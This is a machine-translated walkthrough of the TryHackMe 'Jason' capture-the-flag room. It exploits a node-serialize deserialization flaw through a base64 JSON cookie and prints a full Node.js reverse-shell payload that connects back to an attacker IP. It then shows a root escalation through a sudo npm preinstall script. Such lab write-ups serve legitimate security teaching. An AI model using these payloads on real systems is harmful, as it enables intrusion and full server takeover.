<html>
<head>
<title>TryHackMe Writeup — Jason</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道— Jason</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-jason-f3b251373bcb?source=collection_archive---------0-----------------------#2021-12-02">https://infosecwriteups.com/tryhackme-writeup-jason-f3b251373bcb?source=collection_archive---------0-----------------------#2021-12-02</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="c152" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">嗨，伙计们，又和特里哈克姆with玩得开心了。所以，这是通过这个<strong class="js iu"> Jason </strong>挑战的记录和指南。这间CTF客房是由CTF爱好者为CTF爱好者设计的。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div class="gh gi ko"><img src="../Images/90df8a5ef360c0d4619218b51ebedb52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*QRc5LntUkhldoDtM.png"/></div></figure><p id="5339" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">房间</strong>:<a class="ae kw" href="https://tryhackme.com/room/jason" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/jason</a><br/><strong class="js iu">关卡</strong>:轻松</p><p id="eec7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">任务</strong>:我们是恐怖LLC <strong class="js iu">，</strong>我们专门做恐怖，但是我们公司比较恐怖的一个方面是我们的前端web服务器。我们无法在当前状态下发布我们的网站，我们对网络安全的担忧也在成倍增长。我们要求您执行彻底的渗透测试，并尝试危害根帐户。这次订婚没有规则。祝你好运！</p><h1 id="89e2" class="kx ky it bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">我们开始吧</h1><p id="7702" class="pw-post-body-paragraph jq jr it js b jt lv jv jw jx lw jz ka kb lx kd ke kf ly kh ki kj lz kl km kn im bi translated">像往常一样，启动机器，在浏览器中打开IP</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ma"><img src="../Images/986fda471d3792a4bff1805ca421bc7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6mL_v-ERdBVF1JZUB_PCrg.png"/></div></div></figure><p id="2564" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">使用wappalyzer，没有任何编程栈出来，但网页声称该网站是建立在Nodejs。我们可以注意到这一点。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="78c4" class="mk ky it mg b gy ml mm l mn mo"># nmap -A -T4 -sS -sV -p- 10.10.X.X</span></pre><p id="20f8" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">只有端口80和22可用。22号港口似乎很长时间都无法征服它。让我们找到可能的目录。使用<code class="fe mp mq mr mg b">feroxbuster</code>，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="dbf6" class="mk ky it mg b gy ml mm l mn mo"># feroxbuster --url http://10.10.X.X -w ~/wordlists/dirb/big.txt -t 60 -C 404,403,405<br/>WLD      164l      355w        0c Got 200 for http://10.10.211.48/931607f263af457582369efab02de978 (url length: 32)<br/>200      164l      355w        0c <a class="ae kw" href="http://10.10.211.48/.bashrc" rel="noopener ugc nofollow" target="_blank">http://10.10.211.48/.bashrc</a><br/>200      164l      355w        0c <a class="ae kw" href="http://10.10.211.48/00-mp" rel="noopener ugc nofollow" target="_blank">http://10.10.211.48/00-mp</a><br/>200      164l      355w        0c <a class="ae kw" href="http://10.10.211.48/.ssh" rel="noopener ugc nofollow" target="_blank">http://10.10.211.48/.ssh</a><br/>200      164l      355w        0c <a class="ae kw" href="http://10.10.211.48/!" rel="noopener ugc nofollow" target="_blank">http://10.10.211.48/!</a><br/>200      164l      355w        0c <a class="ae kw" href="http://10.10.211.48/1000" rel="noopener ugc nofollow" target="_blank">http://10.10.211.48/1000</a><br/>200      164l      355w        0c <a class="ae kw" href="http://10.10.211.48/1009" rel="noopener ugc nofollow" target="_blank">http://10.10.211.48/1009</a><br/>200      164l      355w        0c <a class="ae kw" href="http://10.10.211.48/1001" rel="noopener ugc nofollow" target="_blank">http://10.10.211.48/1001</a><br/>....</span></pre><p id="55ee" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">没有结果，因为每条路径都指向同一个索引页。没关系，让我们检查一下剧本，</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ms"><img src="../Images/46a659d2a4a60f1ad388c2fb7c352c01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FddNYELT46r7cCY1mw6HZA.png"/></div></div></figure><p id="aa63" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">有POST方法提交邮件到服务器，结果总是这样显示</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mt"><img src="../Images/363a87d26d81959a236a8689fa57944f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_YxTnSRHZ6jUgyIpsT0uOg.png"/></div></div></figure><p id="9b04" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">通常情况下，每次提交后，cookies都会发生变化。使用cookie编辑器扩展</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mu"><img src="../Images/97795bfeebb3ade1b4e8dfd3e4781ae1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4cSlEcrqZs_2iz4DoUspQQ.png"/></div></div></figure><p id="123b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们解码它，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="4d9b" class="mk ky it mg b gy ml mm l mn mo"># echo -n "eyJlbWFpbCI6InRlc3RpbmdAZ21haWwuY29tIn0=" | base64 -d<br/>{"email":"testing@gmail.com"}</span></pre><p id="eab6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">从响应中，我们知道cookie只是普通的json。我们可以测试cookie，无论电子邮件是否来自cookie。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="eb8f" class="mk ky it mg b gy ml mm l mn mo"># echo -n '{"email":"Hello THM"}' | base64<br/>eyJlbWFpbCI6IkhlbGxvIFRITSJ9</span></pre><p id="3ee7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在cookie编辑器中替换它并刷新页面</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mv"><img src="../Images/3982fb6e63607eaf41062567e56370dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pGXfAusthmvD54K6z86h9w.png"/></div></div></figure><p id="50cc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们知道，在HTML页面中，传递的任何值都是被序列化的<strong class="js iu">和被反序列化的<strong class="js iu"/>。</strong></p><p id="1580" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在exploit-db中搜索Nodejs漏洞似乎不相关且不可执行。试图缩小JSON序列化的google搜索aim，在<code class="fe mp mq mr mg b">node-serialize</code>库中找到了一篇关于反序列化漏洞的文章。</p><p id="f627" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">据作者介绍，<code class="fe mp mq mr mg b">node-serialize</code>内部使用<code class="fe mp mq mr mg b">eval</code>功能。它序列化了几乎所有类型的对象，包括函数。例如:</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="6336" class="mk ky it mg b gy ml mm l mn mo">{"key":"<!-- -->_$$ND_FUNC$$_function() { console.log("Tada"); }()<!-- -->"}</span></pre><p id="760b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这就是带有函数的序列化对象的样子。在反序列化过程中，特殊标签<code class="fe mp mq mr mg b">$$ND_FUNC$$</code>之后的任何内容都直接进入<code class="fe mp mq mr mg b">eval</code>函数。</p><p id="875c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">所以，我们来测试一下。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="6aff" class="mk ky it mg b gy ml mm l mn mo"># echo -n '<!-- -->{"email":"_$$ND_FUNC$$_function(){ return \"Hello THM\"; }()"}<!-- -->' | base64<br/>eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpeyByZXR1cm4gXCJIZWxsbyBUSE1cIjsgfSgpIn0=</span></pre><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mv"><img src="../Images/3982fb6e63607eaf41062567e56370dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pGXfAusthmvD54K6z86h9w.png"/></div></div></figure><p id="6c5f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">起作用了。现在我们肯定可以用它来种植储备贝壳。使用来自PayloadOfAllThings for nodeJS的代码片段，在json中构造有效负载</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="13c5" class="mk ky it mg b gy ml mm l mn mo"># echo -n '{"email": "_$$ND_FUNC$$_function() { var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []);var client = new net.Socket();client.connect(1234, \"10.8.X.X\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}()"}' | base64</span><span id="3998" class="mk ky it mg b gy mw mm l mn mo">eyJlbWFpbCI6ICJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKSB7IHZhciBuZXQgPSByZXF1aXJlKFwibmV0XCIpLCBjcCA9IHJlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLCBzaCA9IGNwLnNwYXduXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxldyBuZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3QoNDQ0NCwgXCIxMC44LjE2My43NFwiLCBmdW5jdGlvbigpe2NsaWVudC5waXBlKHNoLnN0ZGluKTtzaC5zdGRvdXQucGlwZShjbGllbnQpO3NoLnN0ZGVyci5waXBlKGNsaWVudCk7fSk7cmV0dXJuIC9hLzt9KCkifQ==</span></pre><p id="fa91" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">首先运行netcat</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="23e2" class="mk ky it mg b gy ml mm l mn mo"># nc -nlvp 1234</span></pre><p id="e0f0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">然后，用reserve shell有效负载替换cookie</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mx"><img src="../Images/405f98366bb9ba5c497e1692b42ecd72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hnwye19CNKXLtxlxhlqF9w.png"/></div></div></figure><p id="f4dc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">对，现在我们可以访问服务器了！</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="362c" class="mk ky it mg b gy ml mm l mn mo"># nc -lnvp 1234<br/>Connection from 10.10.X.X:50238</span><span id="98a5" class="mk ky it mg b gy mw mm l mn mo">&gt; ls -al ~<br/>total 40<br/>drwxr-xr-x 5 dylan dylan 4096 Jun 10 05:38 .<br/>drwxr-xr-x 3 root  root  4096 Jun 10 03:48 ..<br/>-rw-rw-r-- 1 dylan dylan   66 Jun 10 04:17 .selected_editor<br/>-rw-r--r-- 1 dylan dylan    0 Jun 10 03:50 .sudo_as_admin_successful<br/><strong class="mg iu">-rw-r--r-- 1 dylan dylan   33 Jun 10 04:13 user.txt</strong></span><span id="d688" class="mk ky it mg b gy mw mm l mn mo">&gt; cat ~/user.txt<br/><strong class="mg iu">0ba48780dee9f5677a4XXXXXXXXXXX</strong></span></pre><p id="aac0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们找到了第一面旗子！现在是根旗。</p><p id="7b33" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">首先要检查的是<code class="fe mp mq mr mg b">sudo -l</code></p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="c8f9" class="mk ky it mg b gy ml mm l mn mo">Matching Defaults entries for dylan on jason:<br/>env_reset, mail_badpass,</span><span id="0851" class="mk ky it mg b gy mw mm l mn mo">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><span id="5b64" class="mk ky it mg b gy mw mm l mn mo">User dylan may run the following commands on jason:<br/><strong class="mg iu">(ALL) NOPASSWD: /usr/bin/npm *</strong></span></pre><p id="8910" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">似乎<code class="fe mp mq mr mg b">npm</code>命令不需要密码。关于GTFObins，</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi my"><img src="../Images/a44d6b3989e93bc41639718b8f38ab2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NWLo3YklVVqJzbtfE5kplg.png"/></div></div></figure><p id="3941" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们可以只运行命令</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="7730" class="mk ky it mg b gy ml mm l mn mo">&gt; TF=$(mktemp -d)<br/>&gt; echo '{"scripts": {"preinstall": "/bin/sh"}}' &gt; $TF/package.json<br/>&gt; sudo npm -C $TF --unsafe-perm i</span></pre><p id="59d6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">忠太..Root权限！我们可以简单地遍历并定位root.txt文件</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="7afc" class="mk ky it mg b gy ml mm l mn mo">cat ~/root.txt<br/><strong class="mg iu">0ba48780dee9f5677a4XXXXXXXXXXX</strong></span></pre><p id="2462" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">找到最后一面旗帜！！</p><p id="1508" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">感谢您的阅读，让我们来看看另一篇文章。🤘</p></div></div>    
</body>
</html>